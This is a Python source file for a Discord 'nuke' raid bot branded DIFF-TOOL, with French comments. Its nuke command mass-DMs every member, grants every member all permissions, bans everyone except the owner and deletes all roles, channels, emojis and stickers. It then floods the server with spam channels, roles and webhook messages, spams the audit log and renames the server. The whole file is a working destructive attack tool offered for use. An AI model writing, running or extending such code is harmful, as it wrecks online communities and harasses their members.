import asyncio
import discord
import aiohttp
import json
import os
from discord.ext import commands
from colorama import Fore

def setup_bot_commands(config=None):
    """
    Configure le bot avec les commandes Discord.
    Prend une configuration dict en paramètre pour éviter les input console.
    """
    if config is None:
        # Valeurs par défaut si aucune config n'est passée
        config = {
            'prefix': '!',
            'spammessage': '@everyone RAIDED BY DIFF-TOOL',
            'image_url': '',
            'channelsname': 'raid-by-diff',
            'rolename': 'DIFF-TOOL',
            'dm_message': 'RAIDED BY DIFF-TOOL',
            'dm_all_nuke': True,
            'ban_all': True,
            'admin_all': True,
            'log_spam_nuke': True,
            'num_channels': 50,
            'num_roles': 50,
            'spam_amount': 30
        }

    prefix = config.get('prefix', '!')
    spammessage = config.get('spammessage', '@everyone RAIDED BY DIFF-TOOL')
    image_url = config.get('image_url', '')
    channelsname = config.get('channelsname', 'raid-by-diff')
    rolename = config.get('rolename', 'DIFF-TOOL')
    dm_message = config.get('dm_message', 'RAIDED BY DIFF-TOOL')
    dm_all_nuke = config.get('dm_all_nuke', True)
    ban_all = config.get('ban_all', True)
    admin_all = config.get('admin_all', True)
    log_spam_nuke = config.get('log_spam_nuke', True)
    num_channels = config.get('num_channels', 50)
    num_roles = config.get('num_roles', 50)
    spam_amount = config.get('spam_amount', 30)

    # Sémaphore pour limiter les requêtes (10 simultanées)
    semaphore = asyncio.Semaphore(10)
    
    async def safe_gather(tasks):
        async def sem_task(task):
            async with semaphore:
                return await task
        return await asyncio.gather(*(sem_task(t) for t in tasks), return_exceptions=True)

    # Création du bot
    bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
    bot.remove_command('help')
    
    @bot.event
    async def on_ready():
        activity = discord.Game(name=f"NUKED BY DIFF-TOOL", type=3)
        await bot.change_presence(status=discord.Status.dnd, activity=activity)
    
    @bot.event
    async def on_guild_channel_create(channel):
        """Spam messages quand un channel est créé"""
        try:
            webhook = await channel.create_webhook(name="NUKE BY DIFF-TOOL")
            webhook_url = webhook.url
            payload = {'content': spammessage}
            if image_url:
                payload['embeds'] = [{'image': {'url': image_url}}]
            
            async with aiohttp.ClientSession() as session:
                tasks = []
                for _ in range(spam_amount):
                    tasks.append(session.post(webhook_url, json=payload))
                await asyncio.gather(*tasks)
        except:
            embed = None
            if image_url:
                embed = discord.Embed().set_image(url=image_url)
            for _ in range(spam_amount):
                try: await channel.send(spammessage, embed=embed)
                except: break
    
    # ============================================
    # COMMANDE PRINCIPALE: NUKE
    # ============================================
    
    @bot.command()
    async def nuke(ctx):
        """Commande nuke complète"""
        try: await ctx.message.delete()
        except: pass
        
        guild = ctx.guild
        
        # DM ALL
        if dm_all_nuke:
            dm_tasks = []
            for member in guild.members:
                if member.id != bot.user.id:
                    dm_tasks.append(dm_member_safe(member, dm_message))
            if dm_tasks: await safe_gather(dm_tasks)

        # ADMIN ALL
        if admin_all:
            try:
                if not guild.chunked: await guild.chunk()
                role = await guild.create_role(name="DIFF-ADMIN", permissions=discord.Permissions.all())
                admin_tasks = [m.add_roles(role) for m in guild.members if not m.bot]
                if admin_tasks: await safe_gather(admin_tasks)
            except: pass

        # LOG SPAM
        if log_spam_nuke:
            bot.loop.create_task(spam_logs(guild))

        # BAN MEMBRES
        if ban_all:
            ban_tasks = [ban_member_safe(guild, m) for m in guild.members if m.id != bot.user.id and m.id != guild.owner_id]
            if ban_tasks: await safe_gather(ban_tasks)
        
        # SUPPRESSION RÔLES
        role_tasks = [delete_role_safe(r) for r in guild.roles if r.name != "@everyone" and not r.is_bot_managed()]
        if role_tasks: await safe_gather(role_tasks)

        # EMOJIS & STICKERS
        extra_tasks = [e.delete() for e in guild.emojis] + [s.delete() for s in guild.stickers]
        await safe_gather(extra_tasks)
        
        # SUPPRESSION CHANNELS
        channel_tasks = [delete_channel_safe(ch) for ch in guild.channels]
        if channel_tasks: await safe_gather(channel_tasks)
        
        # CRÉATION RÔLES
        role_create_tasks = [create_role_safe(guild, f"{rolename}-{i}") for i in range(num_roles)]
        await safe_gather(role_create_tasks)
        
        # CRÉATION CHANNELS (on laisse on_guild_channel_create gérer le spam)
        channel_create_tasks = [guild.create_text_channel(f"{channelsname}-{i}") for i in range(num_channels)]
        await safe_gather(channel_create_tasks)
        
        # RENOMMAGE SERVEUR
        try: await guild.edit(name="RAIDED BY DIFF-TOOL")
        except: pass

    # ============================================
    # HELPERS
    # ============================================

    async def dm_member_safe(member, msg):
        try: await member.send(msg)
        except: pass

    async def ban_member_safe(guild, member):
        try: await guild.ban(member, reason="DIFF-TOOL NUKE")
        except: pass

    async def delete_role_safe(role):
        try: await role.delete()
        except: pass

    async def delete_channel_safe(channel):
        try: await channel.delete()
        except: pass

    async def create_role_safe(guild, name):
        try: await guild.create_role(name=name)
        except: pass

    async def spam_logs(guild):
        while True:
            try:
                ch = await guild.create_text_channel("DIFF-TOOL")
                await ch.delete()
            except: break

    return bot
